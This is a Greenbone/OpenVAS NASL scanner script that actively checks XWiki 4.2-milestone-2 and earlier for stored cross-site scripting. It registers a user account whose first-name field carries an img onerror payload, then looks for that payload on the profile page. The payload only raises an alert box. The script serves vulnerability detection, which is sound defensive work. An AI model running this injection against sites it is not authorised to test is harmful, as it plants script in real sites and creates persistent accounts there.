# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:xwiki:xwiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802671");
  script_version("2025-11-19T05:40:23+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-11-19 05:40:23 +0000 (Wed, 19 Nov 2025)");
  script_tag(name:"creation_date", value:"2012-08-30 19:24:16 +0530 (Thu, 30 Aug 2012)");
  script_name("XWiki <= 4.2-milestone-2 Multiple Stored XSS Vulnerabilities - Active Check");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_category(ACT_DESTRUCTIVE_ATTACK); # nb: Stored XSS
  script_family("Web application abuses");
  script_dependencies("gb_xwiki_http_detect.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("xwiki/http/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/20856");
  script_xref(name:"URL", value:"https://exchange.xforce.ibmcloud.com/vulnerabilities/78026");
  script_xref(name:"URL", value:"https://packetstorm.news/files/id/115939");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210123175300/http://www.securityfocus.com/bid/55235");

  script_tag(name:"summary", value:"XWiki is prone to multiple stored cross-site scripting (XSS)
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaws are due to improper validation of user-supplied input
  via:

  - the 'First Name', 'Last Name', 'Company', 'Phone', 'Blog', 'Blog Feed' field when editing a
  user's profile

  - the 'Label' field in WYSIWYG Editor when creating a link

  - the 'SPACE NAME' field when creating a new space");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser session in the context
  of an affected site.");

  script_tag(name:"affected", value:"XWiki version 4.2-milestone-2 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

useragent = http_get_user_agent();
host = http_host_name(port:port);

url = dir + "/bin/register/XWiki/Register";

req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req);

tokenValue = eregmatch(pattern:'name="form_token" value="([a-zA-Z0-9]+)"', string:res);
if (!tokenValue || !tokenValue[1])
  exit(0);

xss = "<img src='1.jpg'onerror=javascript:alert(0)>";

postdata = "form_token=" + tokenValue[1] +
           "&parent=xwiki%3AMain.UserDirectory&" +
           "register_first_name=" + xss + "&" +
           "register_last_name=&" +
           "xwikiname=ThisUserNameDefinitelyNotExists&" +
           "register_password=password&" +
           "register2_password=password&" +
           "register_email=&" +
           "template=XWiki.XWikiUserTemplate&" +
           "xredirect=";

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Referer: http://", host, url, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postdata), "\r\n",
             "\r\n", postdata);
res = http_keepalive_send_recv(port:port, data:req);

if(res) {
  url = dir + "/bin/view/XWiki/ThisUserNameDefinitelyNotExists";

  if(http_vuln_check(port:port, url:url, check_header: TRUE,
     pattern:"<img src='1\.jpg'onerror=javascript:alert\(0\)>")) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
